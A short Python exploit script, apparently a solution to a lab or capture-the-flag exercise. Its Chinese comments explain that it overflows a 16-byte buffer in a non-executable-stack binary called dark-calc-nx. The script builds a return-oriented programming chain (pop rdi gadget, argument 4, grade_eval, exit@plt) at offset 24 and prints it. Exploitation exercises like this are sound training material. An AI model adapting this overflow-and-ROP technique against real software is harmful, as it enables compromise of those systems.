#!/usr/bin/env python3
"""Task 3: ROP —— dark-calc-nx 开了 NX，栈不可执行，改用 ROP 调 grade_eval(4)。

input 的缓冲区仍为 16 字节，返回地址偏移 24。
链: pop rdi; ret -> 4 -> grade_eval -> exit@plt。
"""
import struct
import sys

POP_RDI = 0x401A33        # pop rdi; ret（位于 __libc_csu_init 尾部，取中间指令）
GRADE_EVAL = 0x401978
EXIT_PLT = 0x4016E0

payload = b"A" * 24                    # expression(16) + saved rbp(8)
payload += struct.pack("<Q", POP_RDI)
payload += struct.pack("<Q", 4)
payload += struct.pack("<Q", GRADE_EVAL)
payload += struct.pack("<Q", EXIT_PLT)
payload += b"\n"

sys.stdout.buffer.write(payload)
